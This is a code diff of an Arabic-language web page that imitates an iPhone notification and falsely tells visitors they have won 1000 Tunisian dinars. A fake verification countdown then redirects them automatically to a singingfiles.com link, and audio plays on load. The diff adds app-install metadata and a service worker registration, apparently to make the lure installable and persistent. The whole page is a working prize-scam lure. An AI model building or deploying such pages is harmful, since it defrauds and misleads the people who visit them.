@@ -3,65 +3,63 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>إشعار iPhone - جائزة 1000 دينار</title>
-  <meta property="og:title" content="إشعار iPhone: ربحت 1000 دينار!" />
-  <meta property="og:description" content="اضغط الآن لتأكيد واستلام الجائزة." />
-  <meta property="og:image" content="https://i.imgur.com/3JQ6Z4N.png" />
+  <title>هدية 1000 دينار</title>
+  <link rel="manifest" href="manifest.json">
+  <meta name="theme-color" content="#007aff">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="هدية 1000dt">
+  <link rel="apple-touch-icon" href="icon.png">
   <style>
     body {
-      background-color: #f0f0f5;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Tahoma, sans-serif;
       margin: 0;
       padding: 0;
+      background-color: #f0f2f5;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Tahoma, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
     }
-    .ios-alert {
-      background-color: white;
-      border-radius: 20px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+    .app-box {
+      background: #fff;
       padding: 30px 20px;
       text-align: center;
+      border-radius: 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.15);
       width: 90%;
-      max-width: 350px;
+      max-width: 360px;
     }
-    .ios-alert h2 {
-      color: #007aff;
+    .app-box h1 {
       font-size: 22px;
-      margin-bottom: 10px;
+      color: #007aff;
     }
-    .ios-alert p {
+    .app-box p {
       font-size: 16px;
-      color: #333;
+      margin: 10px 0;
     }
     .countdown {
-      margin: 15px 0;
       font-size: 18px;
       color: #ff3b30;
     }
     .btn {
+      margin-top: 15px;
+      display: inline-block;
       background-color: #007aff;
       color: white;
       padding: 12px 25px;
-      font-size: 16px;
       border-radius: 12px;
+      font-size: 16px;
       text-decoration: none;
-      display: inline-block;
-      margin-top: 10px;
-    }
-    .btn:hover {
-      background-color: #005bb5;
     }
   </style>
 </head>
 <body>
-  <div class="ios-alert">
-    <h2>🔔 إشعار iPhone</h2>
-    <p>🎉 مبروك! لقد ربحت <strong>1000 دينار تونسي</strong>!</p>
+  <div class="app-box">
+    <h1>🔔 إشعار: مبروك!</h1>
+    <p>🎉 لقد ربحت 1000 دينار تونسي!</p>
     <p class="countdown" id="countdown">جارٍ التحقق... 5</p>
-    <a class="btn" href="https://singingfiles.com/show.php?l=0&u=2395961&id=54791">استلام الجائزة الآن</a>
+    <a class="btn" href="https://singingfiles.com/show.php?l=0&u=2395961&id=54791">استلام الجائزة</a>
   </div>
 
   <audio autoplay>
@@ -70,17 +68,23 @@
 
   <script>
     let seconds = 5;
-    const countdown = document.getElementById('countdown');
-    const url = "https://singingfiles.com/show.php?l=0&u=2395961&id=54791";
+    const countdown = document.getElementById("countdown");
+    const redirectUrl = "https://singingfiles.com/show.php?l=0&u=2395961&id=54791";
 
     const timer = setInterval(() => {
       seconds--;
       countdown.textContent = `جارٍ التحقق... ${seconds}`;
       if (seconds <= 0) {
         clearInterval(timer);
-        window.location.href = url;
+        window.location.href = redirectUrl;
       }
     }, 1000);
+  </script>
+
+  <script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('sw.js');
+    }
   </script>
 </body>
 </html>
